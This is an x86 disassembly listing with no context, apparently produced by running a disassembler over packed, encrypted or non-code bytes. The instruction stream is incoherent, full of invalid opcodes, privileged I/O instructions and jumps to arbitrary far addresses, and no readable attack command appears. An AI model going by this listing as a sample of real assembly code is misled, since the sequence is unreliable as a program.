  401924:	bound  eax,QWORD PTR [esi]
  401926:	and    esp,DWORD PTR [ebp+0x52eaf60b]
  40192c:	cmc    
  40192d:	test   DWORD PTR [ecx+0x53],esp
  401930:	mov    ds,WORD PTR [edx+0x4a05d55d]
  401936:	(bad)  
  401937:	sbb    BYTE PTR [eax],bl
  401939:	xchg   esi,eax
  40193a:	jno    0x4018f0
  40193c:	push   edi
  40193d:	dec    ebp
  40193e:	xor    al,BYTE PTR [ebx-0x46]
  401941:	cmp    BYTE PTR ss:[edx+0x382465d2],0x89
  401949:	test   bh,cl
  40194b:	add    DWORD PTR [eax+0x6a5013f],esi
  401951:	adc    BYTE PTR [ecx+0x7166910a],bl
  401957:	inc    esp
  401958:	push   esi
  401959:	push   ebp
  40195a:	out    0x6c,eax
  40195c:	(bad)  [edx+0x573e8a4]
  401962:	ret    
  401963:	gs je  0x401966
  401966:	stos   BYTE PTR es:[edi],al
  401967:	fdiv   QWORD PTR [ecx+0xa30df24]
  40196d:	repz xchg edi,eax
  40196f:	xchg   esi,eax
  401970:	push   0x1db5c14b
  401975:	add    BYTE PTR [edx-0x5326c16d],bh
  40197b:	inc    esi
  40197c:	inc    esp
  40197d:	inc    ebp
  40197e:	imul   edi,DWORD PTR [ebx-0x1c2c4b80],0x6f2eb156
  401988:	jmp    0xd312:0x78a878b1
  40198f:	pop    ecx
  401990:	pop    edx
  401991:	arpl   WORD PTR [esi+0x0],di
  401994:	test   ah,dl
  401996:	lea    edx,[esi+0x21d0dadd]
  40199c:	mov    bh,BYTE PTR [esi+0x19]
  40199f:	and    DWORD PTR [edx],edi
  4019a1:	jge    0x40193e
  4019a3:	ins    BYTE PTR es:[edi],dx
  4019a4:	dec    esi
  4019a5:	rcl    DWORD PTR [edi],cl
  4019a7:	pushf  
  4019a8:	aad    0xb2
  4019aa:	icebp  
  4019ab:	ret    0xf27b
  4019ae:	call   0x2b86:0x1f6e95f6
  4019b5:	repz pushf 
  4019b7:	pop    ss
  4019b8:	fwait
  4019b9:	je     0x401975
  4019bb:	int    0x89
  4019bd:	sahf   
  4019be:	add    DWORD PTR [edx],eax
  4019c0:	mov    dh,0x7f
  4019c2:	cmp    bh,bl
  4019c4:	mov    eax,ds:0x42195481
  4019c9:	and    BYTE PTR [esi-0x13],0xdc
  4019cd:	imul   edi,ebx,0xffffff83
  4019d0:	push   esi
  4019d1:	xor    al,BYTE PTR [edx-0x52]
  4019d4:	xor    al,0x93
  4019d6:	mov    ah,0xea
  4019d8:	rcl    ah,0x43
  4019db:	inc    esp
  4019dc:	xlat   BYTE PTR ds:[ebx]
  4019dd:	push   eax
  4019de:	xchg   esi,eax
  4019df:	mov    DWORD PTR [ecx+0x4149cc9],edi
  4019e5:	inc    ebp
  4019e6:	sub    DWORD PTR [edi],0xffffffef
  4019e9:	add    al,0x3c
  4019eb:	add    al,BYTE PTR [ecx-0x79]
  4019ee:	lock push edi
  4019f0:	stos   DWORD PTR es:[edi],eax
  4019f1:	jp     0x401a54
  4019f3:	jecxz  0x4019f1
  4019f5:	dec    esi
  4019f6:	in     eax,dx
  4019f7:	xchg   ebx,eax
  4019f8:	sbb    ch,bh
  4019fa:	add    edi,edi
  4019fc:	jnp    0x401a42
  4019fe:	retf   0x39d8
  401a01:	fld    DWORD PTR [ebx+esi*1-0x232de662]
  401a08:	pop    edi
  401a09:	jg     0x401a6a
  401a0b:	mov    edi,0xd0df6d1b
  401a10:	lock int3 
  401a12:	adc    eax,0xdba397b0
  401a17:	imul   edi,DWORD PTR [edi-0x13],0x114d542c
  401a1e:	pusha  
  401a1f:	and    cl,BYTE PTR [esi-0x63]
  401a22:	mov    eax,ds:0x46d0e8c1
  401a27:	mov    esp,0x40e22de1
  401a2c:	xor    eax,0xf131f30
  401a31:	inc    ebx
  401a32:	lar    esp,WORD PTR [ecx-0x6a]
  401a36:	pop    edx
  401a37:	test   BYTE PTR [ecx+eax*8],ah
  401a3a:	stc    
  401a3b:	jmp    0xdc4cfacb
  401a40:	mov    edx,0x79003cd7
  401a45:	arpl   WORD PTR [edx-0x71ccc63f],bp
  401a4b:	adc    eax,DWORD PTR [eax]
  401a4d:	retf   0xe0f0
  401a50:	jmp    0xeef04eaf
  401a55:	mov    gs,WORD PTR ds:0x6f28e3e4
  401a5b:	(bad)  
  401a5c:	pop    ss
  401a5d:	in     eax,dx
  401a5e:	icebp  
  401a5f:	jp     0x401ad5
  401a61:	cmp    DWORD PTR [ebp-0x63],esp
  401a64:	loope  0x401ac4
  401a66:	gs dec edx
  401a68:	xchg   bh,bl
  401a6a:	ror    DWORD PTR [edx-0x2a10e20],cl
  401a70:	jns    0x401a50
  401a72:	repnz cmp edx,DWORD PTR [esi+0x59]
  401a76:	pop    esp
  401a77:	fs jo  0x401a2c
  401a7a:	mov    BYTE PTR [edi-0x1b3f17f5],bh
  401a80:	mov    bh,BYTE PTR [ebp-0x17]
  401a83:	or     eax,0x22af3f76
  401a88:	das    
  401a89:	dec    edi
  401a8a:	cwde   
  401a8b:	jae    0x401ac8
  401a8d:	out    0x29,al
  401a8f:	mov    ebp,0x923719a6
  401a94:	mov    dh,BYTE PTR [edi-0x55]
  401a97:	mov    eax,0x5d2a94b2
  401a9c:	lods   eax,DWORD PTR ds:[esi]
  401a9d:	mov    bh,0x48
  401a9f:	jnp    0x401a31
  401aa1:	mov    esi,DWORD PTR [ecx-0xa5502a2]
  401aa7:	sti    
  401aa8:	pop    ds
  401aa9:	ss push es
  401aab:	fisttp WORD PTR [esi+0x2c]
  401aae:	mov    bh,0x1e
  401ab0:	cpuid  
  401ab2:	jbe    0x401b08
  401ab4:	cdq    
  401ab5:	stos   BYTE PTR es:[edi],al
  401ab6:	mov    eax,0x3cce4660
  401abb:	sbb    al,0x9d
  401abd:	mov    esi,fs
  401abf:	or     ebp,DWORD PTR ds:0xf03a1d62
  401ac5:	mov    eax,?
  401ac7:	scas   eax,DWORD PTR es:[edi]
  401ac8:	lahf   
  401ac9:	xchg   DWORD PTR [ebp+0x1f],edi
  401acc:	fs cmp bh,al
  401acf:	rcl    BYTE PTR [ebx],0x8c
  401ad2:	mov    ds:0xd02feb91,eax
  401ad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ad8:	rep stos DWORD PTR es:[edi],eax
  401ada:	inc    eax
  401adb:	push   es
  401adc:	scas   al,BYTE PTR es:[edi]
  401add:	mov    bl,0xb6
  401adf:	and    ebx,esp
  401ae1:	cdq    
  401ae2:	fisub  DWORD PTR [eax]
  401ae4:	daa    
  401ae5:	mov    dl,0x59
  401ae7:	mov    ds:0x6eddcccf,eax
  401aec:	mov    ch,0x14
  401aee:	jmp    0x401ac6
  401af0:	cmp    al,0x91
  401af2:	xchg   esi,eax
  401af3:	jp     0x401ae6
  401af5:	push   DWORD PTR [edi-0x7999cb5f]
  401afb:	in     al,dx
  401afc:	lods   eax,DWORD PTR ds:[esi]
  401afd:	int3   
  401afe:	stos   BYTE PTR es:[edi],al
  401aff:	push   edx
  401b00:	lods   eax,DWORD PTR ds:[esi]
  401b01:	xchg   esp,eax
  401b02:	mov    edi,0xe16f8764
  401b07:	out    0x50,eax
  401b09:	xchg   ebp,eax
  401b0a:	into   
  401b0b:	sbb    dh,al
  401b0d:	add    esi,DWORD PTR [ebx]
  401b0f:	push   ecx
  401b10:	inc    edi
  401b11:	sbb    eax,0xd7edf6c5
  401b16:	out    dx,eax
  401b17:	sbb    edx,DWORD PTR [ebp-0x4f2b8cf3]
  401b1d:	in     al,dx
  401b1e:	cmp    ebp,DWORD PTR [eax+0x55]
  401b21:	scas   eax,DWORD PTR es:[edi]
  401b22:	mov    eax,ds:0xb185babf
  401b27:	fidivr WORD PTR [ecx-0x20]
  401b2a:	jno    0x401b7c
  401b2c:	repnz mov ebx,DWORD PTR [eax-0x29]
  401b30:	hlt    
  401b31:	pop    esi
  401b32:	sub    ebp,DWORD PTR [eax]
  401b34:	push   es
  401b35:	and    eax,DWORD PTR [ebp-0x4a]
  401b38:	pop    esp
  401b39:	pop    ds
  401b3a:	pop    es
  401b3b:	inc    ebx
  401b3c:	xor    edi,esp
  401b3e:	mov    ebp,0xd1a7783d
  401b43:	into   
  401b44:	out    0x82,al
  401b46:	adc    ch,cl
  401b48:	das    
  401b49:	mov    dl,0xa
  401b4b:	jne    0x401b79
  401b4d:	daa    
  401b4e:	shr    BYTE PTR [ecx],1
  401b50:	inc    ecx
  401b51:	cli    
  401b52:	add    al,0xbf
  401b54:	xchg   ebx,eax
  401b55:	mov    ?,WORD PTR [esi]
  401b57:	scas   al,BYTE PTR es:[edi]
  401b58:	(bad)  
  401b59:	retf   0xfcab
  401b5c:	dec    ebp
  401b5d:	clc    
  401b5e:	les    ebp,FWORD PTR [ebx]
  401b60:	jg     0x401b50
  401b62:	leave  
  401b63:	std    
  401b64:	inc    eax
  401b65:	in     al,0x53
  401b67:	mov    esi,0x77cb6e13
  401b6c:	loope  0x401bc8
  401b6e:	mov    DWORD PTR [ebx+ebp*4-0x16829d9b],eax
  401b75:	mov    eax,ds:0x90331720
  401b7a:	mov    ebx,ds
  401b7c:	outs   dx,BYTE PTR ds:[esi]
  401b7d:	add    al,0x5c
  401b7f:	cmc    
  401b80:	push   0xffffffae
  401b82:	xchg   BYTE PTR [edi-0x57],al
  401b85:	aaa    
  401b86:	mov    edi,0x2dcfbd9b
  401b8b:	pop    es
  401b8c:	scas   al,BYTE PTR es:[edi]
  401b8d:	out    0xa3,eax
  401b8f:	inc    ecx
  401b90:	out    dx,eax
  401b91:	lock mov ?,WORD PTR [edx-0x28]
  401b95:	push   ss
  401b96:	pop    esi
  401b97:	fisubr WORD PTR [ecx-0xc]
  401b9a:	mov    esi,0xc7cd5cea
  401b9f:	mov    ds:0x70407e93,eax
  401ba4:	(bad)  
  401ba5:	in     eax,dx
  401ba6:	(bad)  
  401ba7:	lock std 
  401ba9:	call   0x60983e23
  401bae:	out    0xba,eax
  401bb0:	call   0x6e71:0xdf353318
  401bb7:	shl    DWORD PTR [esi+0x63e9e917],cl
  401bbd:	mov    edi,DWORD PTR [ebp+0x6a]
  401bc0:	adc    eax,0x46afc8ad
  401bc5:	jns    0x401c43
  401bc7:	sar    ch,cl
  401bc9:	nop
  401bca:	mov    DWORD PTR [esi],0x4a52e744
  401bd0:	sub    BYTE PTR [ecx],bl
  401bd2:	popa   
  401bd3:	push   edi
  401bd4:	add    BYTE PTR [edx+0x25f27688],dh
  401bda:	mov    ah,0x4c
  401bdc:	cs inc ebp
  401bde:	in     al,0x97
  401be0:	pop    es
  401be1:	xor    eax,0x2a49b6cb
  401be6:	mov    bl,0xd3
  401be8:	push   ecx
  401be9:	pop    ss
  401bea:	sar    DWORD PTR [eax],1
  401bec:	xchg   edx,eax
  401bed:	xchg   ebp,eax
  401bee:	es nop
  401bf0:	adc    BYTE PTR [ebx],bh
  401bf2:	adc    DWORD PTR [ebx-0x5d],esi
  401bf5:	sub    DWORD PTR [ebx-0x45c5c1d4],0x4a656bd5
  401bff:	test   DWORD PTR ds:0x78ac0dde,0xb6eb9a86
  401c09:	daa    
  401c0a:	(bad)  
  401c0b:	aad    0xae
  401c0d:	loop   0x401ba2
  401c0f:	pop    ecx
  401c10:	jb     0x401bed
  401c12:	out    0x5,al
  401c14:	arpl   WORD PTR ds:[ebp-0x2e],dx
  401c18:	fst    QWORD PTR [ecx-0x45]
  401c1b:	nop
  401c1c:	push   ss
  401c1d:	jle    0x401c53
  401c1f:	test   eax,0x445303a5
  401c24:	push   ecx
  401c25:	jae    0x401bfe
  401c27:	fs and esi,ebp
  401c2a:	cs pop ds
  401c2c:	mov    ebx,0xf0004480
  401c31:	popa   
  401c32:	jo     0x401c69
  401c34:	cli    
  401c35:	pop    ss
  401c36:	inc    eax
  401c37:	inc    edx
  401c38:	or     dh,BYTE PTR [esi]
  401c3a:	sbb    cl,BYTE PTR [esi]
  401c3c:	jno    0x401c0b
  401c3e:	xlat   BYTE PTR ds:[ebx]
  401c3f:	mov    BYTE PTR [edi+ebx*1+0x1c],ch
  401c43:	mov    al,ds:0x8b7b3a9d
  401c48:	dec    edx
  401c49:	and    eax,0xa69254c8
  401c4e:	jg     0x401c92
  401c50:	or     cl,BYTE PTR [edx-0x13]
  401c53:	and    al,0x43
  401c55:	jmp    0xd7423cd3
  401c5a:	(bad)  
  401c5c:	xor    eax,0xa5b0e18d
  401c61:	push   edi
  401c62:	rcr    ah,cl
  401c64:	mov    edx,0x3fbfcc5c
  401c69:	adc    eax,0x8af2af19
  401c6e:	mov    BYTE PTR [ebx-0x71fd8e9],0x3f
  401c75:	or     eax,0x1b
  401c78:	push   sp
  401c7a:	retf   0xcedc
  401c7d:	pop    ebx
  401c7e:	repnz shr esp,1
  401c81:	pmullw mm4,QWORD PTR [esi+esi*4]
  401c85:	stos   BYTE PTR es:[edi],al
  401c86:	call   DWORD PTR [ecx+0x32cec702]
  401c8c:	outs   dx,BYTE PTR ds:[esi]
  401c8d:	clc    
  401c8e:	inc    esi
  401c8f:	sti    
  401c90:	fsubp  st(4),st
  401c92:	push   ds
  401c93:	pop    ss
  401c94:	aam    0xa1
  401c96:	scas   al,BYTE PTR es:[edi]
  401c97:	sbb    BYTE PTR [esi+ecx*4],0x22
  401c9b:	hlt    
  401c9c:	mov    ?,WORD PTR [ecx-0x6c07e166]
  401ca2:	out    dx,al
  401ca3:	lahf   
  401ca4:	aad    0x6d
  401ca6:	rol    DWORD PTR [ebp-0x58],1
  401ca9:	add    dh,bl
  401cab:	cmc    
  401cac:	adc    DWORD PTR [edx],esi
  401cae:	add    BYTE PTR [esi+ebp*8],bh
  401cb1:	jp     0x401cdc
  401cb3:	pusha  
  401cb4:	shl    DWORD PTR [edi+0x4f],0x25
  401cb8:	mov    ?,WORD PTR [eax]
  401cba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cbb:	mov    al,0x23
  401cbd:	sbb    DWORD PTR [eax-0x4a341e8f],eax
  401cc3:	xchg   BYTE PTR [ecx+0x58],ch
  401cc6:	repz mov edi,0xca4c413f
  401ccc:	dec    edi
  401ccd:	inc    ebx
  401cce:	cmp    al,0x34
  401cd0:	and    BYTE PTR [edi-0xcc49707],bh
  401cd6:	jge    0x401cfd
  401cd8:	dec    edi
  401cd9:	es jle 0x401c61
  401cdc:	and    DWORD PTR ds:0xe3e00ce2,edx
  401ce2:	leave  
  401ce3:	aam    0xd1
  401ce5:	nop
  401ce6:	sbb    al,0x32
  401ce8:	xchg   ebp,eax
  401ce9:	lock arpl WORD PTR [ebx],cx
  401cec:	mov    fs,WORD PTR [esi]
  401cee:	sbb    dl,bh
  401cf0:	xchg   ecx,eax
  401cf1:	retf   
  401cf2:	pop    esp
  401cf3:	sar    DWORD PTR [ebx-0x660cdba3],0x24
  401cfa:	jp     0x401cf1
  401cfc:	xor    ebx,0x644a0a87
  401d02:	mov    edi,0x3628e45
  401d07:	and    BYTE PTR [edi+0x61b3be28],bh
  401d0d:	push   0xffffffac
  401d0f:	or     DWORD PTR [edi],edi
  401d11:	das    
  401d12:	dec    ebx
  401d13:	enter  0x2e8f,0x8a
  401d17:	push   esp
  401d18:	jbe    0x401ccb
  401d1a:	iret   
  401d1b:	in     al,0xcb
  401d1d:	inc    eax
  401d1e:	xor    BYTE PTR [ebp-0x1f08807c],al
  401d24:	fisttp QWORD PTR [eax+0x2c]
  401d27:	inc    DWORD PTR [ebx+0x1f]
  401d2a:	sbb    BYTE PTR [eax],ch
  401d2c:	sub    BYTE PTR [ecx],ah
  401d2e:	sbb    eax,0xfbae7f8e
  401d33:	mov    bh,0x2
  401d35:	mov    dh,0x77
  401d37:	jo     0x401d0f
  401d39:	das    
  401d3a:	retf   
  401d3b:	pop    ebp
  401d3c:	icebp  
  401d3d:	pop    esi
  401d3e:	iret   
  401d3f:	mov    dl,0xce
  401d41:	pop    ds
  401d42:	add    DWORD PTR [ebp+eax*8-0x22],0xfffffffb
  401d47:	ret    0x2892
  401d4a:	ret    0x8725
  401d4d:	icebp  
  401d4e:	and    eax,0xaf26c89c
  401d53:	outs   dx,BYTE PTR ds:[esi]
  401d54:	ss ins BYTE PTR es:[edi],dx
  401d56:	inc    ecx
  401d57:	call   0x6b11:0x962c2127
  401d5e:	int3   
  401d5f:	call   0x6cb9a466
  401d64:	add    eax,DWORD PTR [edi]
  401d66:	lahf   
  401d67:	mov    ch,0x3d
  401d69:	aas    
  401d6a:	test   eax,0x9808c020
  401d6f:	pop    eax
  401d70:	stos   DWORD PTR es:[edi],eax
  401d71:	xchg   esp,eax
  401d72:	dec    eax
  401d73:	mov    ds:0xcdf6b7d2,eax
  401d78:	sbb    ecx,DWORD PTR [eax-0xc84b0d2]
  401d7e:	sbb    DWORD PTR [ebx+0x3b],eax
  401d81:	fst    QWORD PTR [ebp-0x79651c28]
  401d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d88:	sbb    al,0xd2
  401d8a:	add    bh,BYTE PTR [eax+esi*8+0x7d]
  401d8e:	push   0x97c006b2
  401d93:	inc    esp
  401d94:	mov    ah,0x21
  401d96:	inc    eax
  401d97:	imul   edx,DWORD PTR [edi+0x50a8c83a],0xf647e82c
  401da1:	aad    0x1d
  401da3:	jmp    0x401d4c
  401da5:	in     eax,0x15
  401da7:	inc    ebp
  401da8:	or     al,0x57
  401daa:	mov    bl,BYTE PTR ds:0x53210e2d
  401db0:	sbb    eax,0xb56b64fa
  401db5:	sub    DWORD PTR [esi-0x7c00d187],ebp
  401dbb:	daa    
  401dbc:	test   al,0xb0
  401dbe:	push   cs
  401dbf:	mov    ds:0x3a9daf4e,eax
  401dc4:	ins    BYTE PTR es:[edi],dx
  401dc5:	leave  
  401dc6:	ror    DWORD PTR [eax*2+0x3b1c57fb],0xcb
  401dce:	or     DWORD PTR [edx+0x16442234],0xffffffe2
  401dd5:	ds jae 0x401e03
  401dd8:	push   ebp
  401dd9:	mov    WORD PTR [esp+ebx*1],ds
  401ddc:	mov    bx,0x9b5
  401de0:	fiadd  WORD PTR [ebp-0x1cdf14c5]
  401de6:	sbb    edi,DWORD PTR [esi-0x2a]
  401de9:	(bad)  
  401dea:	jmp    0x49d3:0xb1da06a9
  401df1:	dec    ecx
  401df2:	ffreep st(4)
  401df4:	mov    BYTE PTR [ebx+0x4ff3f8dd],cl
  401dfa:	test   BYTE PTR [edi+0x245334e3],ch
  401e00:	lahf   
  401e01:	(bad)  [edx]
  401e03:	xlat   BYTE PTR ds:[ebx]
  401e04:	cwde   
  401e05:	lock mov ds:0xa0ce070,al
  401e0b:	imul   esi,DWORD PTR [ebx-0x25c74171],0xffffffe8
  401e12:	clc    
  401e13:	mov    edi,0xeb381da2
  401e18:	fist   DWORD PTR [eax]
  401e1a:	mov    bh,0x56
  401e1c:	clc    
  401e1d:	aas    
  401e1e:	inc    esi
  401e1f:	pop    edx
  401e20:	iret   
  401e21:	lea    edi,ds:0xafa2c1e0
  401e27:	fbstp  TBYTE PTR [edi]
  401e29:	arpl   ax,dx
  401e2b:	xchg   edi,eax
  401e2c:	cdq    
  401e2d:	xor    DWORD PTR [ebx+0xdd283e6],eax
  401e33:	cmc    
  401e34:	icebp  
  401e35:	xchg   esp,eax
  401e36:	mov    esi,0xdae0e6
  401e3b:	cmp    edx,ebp
  401e3d:	mov    eax,0x6d11b6da
  401e42:	cld    
  401e43:	dec    edi
  401e44:	stc    
  401e45:	je     0x401e30
  401e47:	xor    esp,ecx
  401e49:	adc    eax,0xe1e71c4e
  401e4e:	mov    dh,0xb5
  401e50:	mov    bh,BYTE PTR [ebx]
  401e52:	test   BYTE PTR [esi],dh
  401e54:	addr16 pop ds
  401e56:	cs xchg ebp,eax
  401e58:	je     0x401ed8
  401e5a:	daa    
  401e5b:	xor    dl,BYTE PTR [eax-0x30]
  401e5e:	mov    ds:0xa83ce7f7,eax
  401e63:	test   al,0x6c
  401e65:	popa   
  401e66:	push   edi
  401e67:	xor    al,0xc1
  401e69:	and    dh,BYTE PTR ds:0x4e02d784
  401e6f:	sub    ecx,ecx
  401e71:	fwait
  401e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e73:	jp     0x401eba
  401e75:	cli    
  401e76:	lock jbe 0x401e4a
  401e79:	imul   ebx,edx,0x635df555
  401e7f:	mov    esi,0x3dfcfd5b
  401e84:	sub    edx,DWORD PTR [ecx-0x66410dd9]
  401e8a:	mov    BYTE PTR [edx+0x14],ch
  401e8d:	inc    ebp
  401e8e:	mov    ebp,DWORD PTR [ecx-0x360e874]
  401e94:	cmp    esp,DWORD PTR [ebp-0x16]
  401e97:	mov    eax,ds:0x57ed46c4
  401e9c:	mov    edx,0x61d889ba
  401ea1:	jl     0x401e40
  401ea3:	dec    eax
  401ea4:	(bad)  
  401ea5:	aam    0xa9
  401ea7:	hlt    
  401ea8:	sbb    DWORD PTR [esi],edi
  401eaa:	mov    ecx,0x20f819d4
  401eaf:	sbb    al,BYTE PTR [eax]
  401eb1:	inc    ebp
  401eb2:	xchg   ebp,eax
  401eb3:	lds    edx,FWORD PTR [ecx+0x2b409de9]
  401eb9:	inc    ecx
  401eba:	push   es
  401ebb:	es pop es
  401ebd:	icebp  
  401ebe:	mov    ds:0xfc08becb,al
  401ec3:	cmp    BYTE PTR [ebx+ebx*1],ah
  401ec6:	mov    ds:0x9f11da3,al
  401ecb:	icebp  
  401ecc:	(bad)  
  401ecd:	sbb    eax,0x35d25b2e
  401ed2:	push   cs
  401ed3:	and    edi,ebp
  401ed5:	and    DWORD PTR [ebx+0x889ed9b],esi
  401edb:	leave  
  401edc:	or     BYTE PTR [edi+0x14d12d9d],ch
  401ee2:	mov    edi,0xf70feed9
  401ee7:	fisttp DWORD PTR [ebx+0x4ba67b30]
  401eed:	icebp  
  401eee:	in     al,0xd5
  401ef0:	cmp    eax,0xfddd1cda
  401ef5:	or     esi,DWORD PTR [esi]
  401ef7:	sub    al,0x9c
  401ef9:	pop    ecx
  401efa:	mov    esi,ecx
  401efc:	xor    DWORD PTR [edx-0x2ee89418],edx
  401f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f03:	in     eax,dx
  401f04:	fsub   QWORD PTR fs:[ecx]
  401f07:	push   es
  401f08:	add    edx,DWORD PTR [esi+0x68]
  401f0b:	lea    edi,[eax-0x5]
  401f0e:	lahf   
  401f0f:	pop    eax
  401f10:	(bad)  
  401f11:	sub    eax,DWORD PTR [eax-0xf50a31a]
  401f17:	fisub  WORD PTR [esi]
  401f19:	(bad)  
  401f1a:	cld    
  401f1b:	sub    al,0xcd
  401f1d:	test   BYTE PTR [edx],ah
  401f1f:	pop    edi
  401f20:	shl    BYTE PTR [esi],0xad
  401f23:	ja     0x401ebf
  401f25:	jg     0x401ed4
  401f27:	xchg   edx,eax
  401f28:	adc    BYTE PTR [ebp+0x5b],dh
  401f2b:	fbstp  TBYTE PTR [eax]
  401f2d:	push   ds
  401f2e:	popf   
  401f2f:	fdivp  st(0),st
  401f31:	pop    edx
  401f32:	mov    esp,0x87f615be
  401f37:	mov    esp,0x917d4e37
  401f3c:	jnp    0x401f29
  401f3e:	pop    ebp
  401f3f:	jle    0x401f45
  401f41:	and    DWORD PTR [edi-0x63],ecx
  401f44:	dec    ebp
  401f45:	xlat   BYTE PTR ds:[ebx]
  401f46:	dec    esi
  401f47:	sub    eax,0x659e0994
  401f4c:	add    dh,BYTE PTR [ecx]
  401f4e:	fldenv [edx+edi*4+0x1e84f987]
  401f55:	loop   0x401f11
  401f57:	rcr    BYTE PTR [eax+0x38],0xd4
  401f5b:	jb     0x401ef6
  401f5d:	mov    dh,0xa5
  401f5f:	ret    
  401f60:	test   al,0x5e
  401f62:	sub    ecx,DWORD PTR [ebx]
  401f64:	das    
  401f65:	stos   BYTE PTR es:[edi],al
  401f66:	ret    
  401f67:	push   edx
  401f68:	xor    ebx,ebp
  401f6a:	push   edx
  401f6b:	and    ch,BYTE PTR [ebx]
  401f6d:	loope  0x401f00
  401f6f:	sbb    al,0xc5
  401f71:	lea    edx,[ebx+0x60]
  401f74:	mov    ds:0x35241fc,eax
  401f79:	sbb    cl,BYTE PTR [ecx+0x2505266e]
  401f7f:	or     BYTE PTR [ecx+0xc],0xf6
  401f83:	sar    BYTE PTR ds:0xe49e726,0xe5
  401f8a:	lods   al,BYTE PTR ds:[esi]
  401f8b:	inc    ebp
  401f8c:	inc    ecx
  401f8d:	repz inc ebp
  401f8f:	in     al,dx
  401f90:	retf   0x96e1
  401f93:	dec    ebx
  401f94:	mov    bl,BYTE PTR [ebp+0x5282c907]
  401f9a:	and    eax,0x54cc4d93
  401f9f:	mov    esp,0x5d6834fc
  401fa4:	outs   dx,DWORD PTR ds:[esi]
  401fa5:	adc    bl,BYTE PTR [edi]
  401fa7:	aam    0x9a
  401fa9:	sub    dl,dh
  401fab:	xchg   esi,eax
  401fac:	sub    DWORD PTR [edi-0x39],ebx
  401faf:	cmp    ebx,DWORD PTR [edx+0x28]
  401fb2:	gs or  al,0xb9
  401fb5:	lods   eax,DWORD PTR ds:[esi]
  401fb6:	mov    al,ds:0x618d87ca
  401fbb:	push   edx
  401fbc:	cmp    dh,0x47
  401fbf:	(bad)  
  401fc0:	nop
  401fc1:	imul   edx,esp,0x352ca177
  401fc7:	adc    bl,BYTE PTR [eax+0x1c]
  401fca:	fwait
  401fcb:	into   
  401fcc:	mov    ebp,0xca2baadc
  401fd1:	inc    ebx
  401fd2:	das    
  401fd3:	dec    esp
  401fd4:	inc    esp
  401fd5:	rcl    bl,0x73
  401fd8:	jle    0x402011
  401fda:	add    DWORD PTR [ebp+ebp*4+0xbba4c4d],ecx
  401fe1:	mov    edx,0x2714fc18
  401fe6:	aam    0xdf
  401fe8:	xchg   edi,eax
  401fe9:	(bad)  
  401fea:	call   0xd1e77e2d
  401fef:	mov    edx,0x1467bcfb
  401ff4:	loope  0x40200d
  401ff6:	jb     0x401fb8
  401ff8:	test   BYTE PTR [edi],al
  401ffa:	mov    al,0xca
  401ffc:	repz pop edi
  401ffe:	retf   0x3b19
  402001:	or     eax,0xa359626e
  402006:	inc    BYTE PTR [edx*1-0x1c6068c8]
  40200d:	jmp    0x401fbd
  40200f:	out    0x17,al
  402011:	mov    dl,0x2c
  402013:	popf   
  402014:	dec    edi
  402015:	mov    ds:0x9cd6072,eax
  40201a:	out    dx,al
  40201b:	getsec 
  40201d:	push   cs
  40201e:	and    BYTE PTR [edi+0x9],ch
  402021:	lea    edi,[ebx]
  402023:	or     BYTE PTR [eax-0x3296a975],dh
  402029:	adc    eax,DWORD PTR [ebx-0x6]
  40202c:	cli    
  40202d:	mov    ds:0x1e421e4e,al
  402032:	xchg   ecx,eax
  402033:	cwde   
  402034:	fs (bad) 
  402036:	out    0xf9,eax
  402038:	jae    0x401fba
  40203a:	aas    
  40203b:	sbb    ecx,DWORD PTR [ebx+0x1cda4a33]
  402041:	adc    al,0x4d
  402043:	cmp    ch,BYTE PTR [edi+eiz*4]
  402046:	inc    ebp
  402047:	jl     0x402091
  402049:	add    eax,0x1f29ec5b
  40204e:	outs   dx,DWORD PTR ds:[esi]
  40204f:	enter  0xbfa7,0x1d
  402053:	popa   
  402054:	lahf   
  402055:	hlt    
  402056:	fidivr DWORD PTR [ecx]
  402058:	inc    ebx
  402059:	or     eax,0xa1448deb
  40205e:	int    0x23
  402060:	or     dl,dl
  402062:	jns    0x40201d
  402064:	fdiv   DWORD PTR [ecx+ebp*1-0x86e7470]
  40206b:	int3   
  40206c:	xor    eax,0x27829c1b
  402071:	cwde   
  402072:	xchg   esi,eax
  402073:	push   edx
  402074:	lods   eax,DWORD PTR ds:[esi]
  402075:	(bad)  
  402077:	cs mov bh,0x4
  40207a:	shl    BYTE PTR [edi-0x1b],cl
  40207d:	inc    esi
  40207e:	fldenv [edx+0x47]
  402081:	not    ebx
  402083:	push   eax
  402084:	addr16 and eax,0x387d3582
  40208a:	mov    esp,0x16fb4946
  40208f:	ret    0x90f9
  402092:	dec    edi
  402093:	mov    edx,0xa78d3d7a
  402098:	in     al,dx
  402099:	xchg   ebp,eax
  40209a:	adc    esi,DWORD PTR [ebx+ebx*2+0x2e]
  40209e:	add    al,0xde
  4020a0:	out    0xde,al
  4020a2:	cmp    eax,DWORD PTR [eax+0x17f49c03]
  4020a8:	mov    ch,0xe5
  4020aa:	sar    edi,0xa3
  4020ad:	loopne 0x4020bd
  4020af:	or     DWORD PTR [ebx+0x40f0e8e3],edx
  4020b5:	sbb    dl,cl
  4020b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020b8:	push   eax
  4020b9:	cmp    al,0x91
  4020bb:	mov    esi,0xb11e7a26
  4020c0:	(bad)  
  4020c2:	pusha  
  4020c3:	xchg   ebp,ecx
  4020c5:	jg     0x402105
  4020c7:	push   ebx
  4020c8:	add    ch,BYTE PTR [eax-0x59]
  4020cb:	push   cs
  4020cc:	adc    dl,al
  4020ce:	inc    ecx
  4020cf:	mul    cl
  4020d1:	leave  
  4020d2:	arpl   WORD PTR [edx-0x4b],sp
  4020d5:	ror    DWORD PTR [esi+0x2f],cl
  4020d8:	inc    edi
  4020d9:	mov    ds:0x4b518ecd,al
  4020de:	jae    0x40213b
  4020e0:	jmp    0xf54e2504
  4020e5:	adc    al,dh
  4020e7:	jge    0x40209f
  4020e9:	ret    
  4020ea:	sub    eax,0xd51297f
  4020ef:	arpl   WORD PTR [ebp+0x2ef5e1af],si
  4020f5:	(bad)  
  4020f7:	add    eax,0x8b373cc7
  4020fc:	aam    0x60
  4020fe:	stos   DWORD PTR es:[edi],eax
  4020ff:	sub    eax,0x8df84f04
  402104:	pop    ebp
  402105:	addr16 mov eax,ds:0x5273
  402109:	pop    ecx
